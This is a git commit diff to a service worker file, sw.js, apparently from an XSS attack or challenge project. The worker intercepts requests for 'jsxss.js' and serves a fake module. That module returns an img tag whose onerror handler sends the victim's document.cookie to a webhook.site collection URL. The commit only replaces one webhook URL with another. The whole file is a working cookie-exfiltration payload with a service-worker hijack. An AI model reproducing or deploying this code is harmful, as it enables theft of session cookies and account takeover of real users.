cfea9c66f8fd02d253f5231852f649d9dc507da2
Namiii135 <toxicaurayt.01@gmail.com>
2026-09-05 14:10:56 +0800

    l

--- sw.js
+++ sw.js
@@ -3,11 +3,10 @@ self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
 
 self.addEventListener('fetch', (event) => {
   const url = event.request.url;
-  // Intercept the dynamic ES module import from cs.js
   if (url === 'http://localhost:3000/jsxss.js' || url.endsWith('/jsxss.js')) {
     const fakeModule = `
       export default function(input) {
-        return '<img src=x onerror="fetch(\\'https://webhook.site/4a29bed7-e07e-434b-83d9-38ee5cb315a0?c=\\'+encodeURIComponent(document.cookie))">';
+        return '<img src=x onerror="fetch(\\'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?c=\\'+encodeURIComponent(document.cookie))">';
       }
     `;
     event.respondWith(
